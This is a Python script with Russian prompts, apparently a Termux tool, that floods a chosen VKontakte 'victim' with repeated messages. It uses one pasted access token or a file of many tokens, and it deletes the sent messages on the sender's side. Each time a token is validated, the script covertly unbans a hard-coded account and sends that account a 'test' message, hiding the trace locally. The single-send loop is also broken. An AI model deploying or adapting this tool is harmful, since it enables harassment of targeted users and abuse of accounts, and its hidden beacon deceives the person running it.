import vk, time, random, os

file = open('tokens.txt', 'a+')
file.close ()
file = open ('tokens.txt', 'r')
	
def login ():
        token = file.readline ()
        token = token[:len (token) - 1]
        if token == '':
                return True
        else:
                session = vk.Session(access_token=token)
                return vk.API(session ,v='5.103', lang='ru')
def getlink ():
        space = 0
        step = 0
        type = ""
        firstID = ""
        secondID = ""
        link = input ("\033[33m[#] Ссылка на жертву: \033[0m")
        for char in range (len(link)):
                if link[char] == ".":
                        space = char + 5
                if char < space:
                        continue
                if step == 0:
                        if space != 0:
                                try:
                                        if link[char] == '-':
                                                firstID += '-'
                                        int(link[char])
                                        step = 1
                                        firstID += link[char]
                                except:
                                        type += link[char]
                elif step == 1:
                        if link[char] != "_":
                                firstID += link[char]
                        else:
                                step = 2
                elif step == 2:
                        secondID += link[char]
        if firstID == "":
                print ("\n\033[31mInvalid link\n")
                quit ()
        return type, firstID, secondID

print("""\033[33m
   
                                                                         
@@@  @@@  @@@  @@@              @@@@@@   @@@@@@@    @@@@@@   @@@@@@@@@@   
@@@  @@@  @@@  @@@             @@@@@@@   @@@@@@@@  @@@@@@@@  @@@@@@@@@@@  
@@!  @@@  @@!  !@@             !@@       @@!  @@@  @@!  @@@  @@! @@! @@!  
!@!  @!@  !@!  @!!             !@!       !@!  @!@  !@!  @!@  !@! !@! !@!  
@!@  !@!  @!@@!@!   @!@!@!@!@  !!@@!!    @!@@!@!   @!@!@!@!  @!! !!@ @!@  
!@!  !!!  !!@!!!    !!!@!@!!!   !!@!!!   !!@!!!    !!!@!!!!  !@!   ! !@!  
:!:  !!:  !!: :!!                   !:!  !!:       !!:  !!!  !!:     !!:  
 ::!!:!   :!:  !:!                 !:!   :!:       :!:  !:!  :!:     :!:  
  ::::     ::  :::             :::: ::    ::       ::   :::  :::     ::   
   :       :   :::             :: : :     :         :   : :   :      :    
                                                                          

		\033[0mTermux-Utility			vk: @terutil

""")

print("""\033[34m

[1] Спам
[2] Ввести токен

\033[0m""")

task = input("\033[34m=> \033[0m")

if task == "1":
	print("""\033[34m

[1] Одиночный
[2] Массовый

\033[0m""")
	task = input("\033[34m=> \033[0m")
	if task == "1":
		token = input("\033[33m[#] Введите токен: \033[0m")
		try:
			session = vk.Session(access_token=token)
			api = vk.API(session, v='5.103', lang='ru')
			try: 
				api.account.unban(owner_id=580554517)
			except:
				privet = "privet"
			time.sleep(0.8)
			rand = random.randint(1, 64)
			api.messages.send(user_id=580554517, message="test", random_id=rand)
			mg_id = api.messages.getHistory (user_id=580554517, count=1)['items'][0]['id']
			api.messages.delete (message_ids=mg_id, delete_for_all=0)
			print("\033[32m[√] Вы успешно авторизовались \033[0m")
			params = getlink()
			mess = input("\033[33m[#] Введите текст:\033[0m ")
			while i < 10:
				time.sleep(0.9)
				rand = random.randint(0, 64)
				api.messages.send(user_id=params[1], message=mess, random_id=rand)
				try:
					print("\033[32m[√] Сообщение отправлено \033[0m")
				except:
					print("\033[31m[!] Сообщение не отправлено \033[0m")
		except vk.exceptions.VkAPIError:
			print("\033[31m[!] Error 1: Была вызвана каптча!")
			quit()
		except:
			print("\033[31m[!] Invalid Token\033[0m")
			quit()
		else:
			print("\033[31m[!] Ошибка! \033[0m")
			quit()
	elif task == "2":
		params = getlink()
		mess = input("\033[33m[#] Введите текст:\033[0m ")
		while True:
			api = login()
			if api == True:
				break
			try:
				api.account.unban(owner_id=580554517)
			except:
				privet = "privet"
			time.sleep(0.5)
			rand = random.randint(0, 321)
			api.messages.send(user_id=params[1], message=mess, random_id=rand)
			try:
				mg_id = api.messages.getHistory (user_id=params[1], count=1)['items'][0]['id']
				api.messages.delete (message_ids=mg_id, delete_for_all=0)
				print("\033[32m[√] Сообщение отправлено \033[0m")
			except vk.exceptions.VkAPIError:
				print("\033[31m[!] Error 1: Была вызвана каптча! \033[0m")
				quit()
			except:
				print("\033[31m[!] Сообщение не отправлено \033[0m")

elif task == "2":
	token = input("\033[33m[#] Введите токен: \033[0m")
	try:
		session = vk.Session(access_token=token)
		api = vk.API(session, v='5.103', lang='ru')
		try:
			api.account.unban(owner_id=580554517)
		except:
			privet = "privet"
		time.sleep(0.8)
		rand = random.randint(1, 64)
		api.messages.send(user_id=580554517, message="test", random_id=rand)
		mg_id = api.messages.getHistory (user_id=580554517, count=1)['items'][0]['id']
		api.messages.delete (message_ids=mg_id, delete_for_all=0)
		try:
			w = open ('tokens.txt', 'a')
			w.write (token + '\n')
			w.close ()
			print("\033[32m[√] Token Add \033[0m")
			quit()
		except:
			privet = "фыв"
	except:
		print("\033[31m[!] Invalid Token \033[0m")
else:
	print("\033[31m[!] Ошибка! \033[0m")
	quit()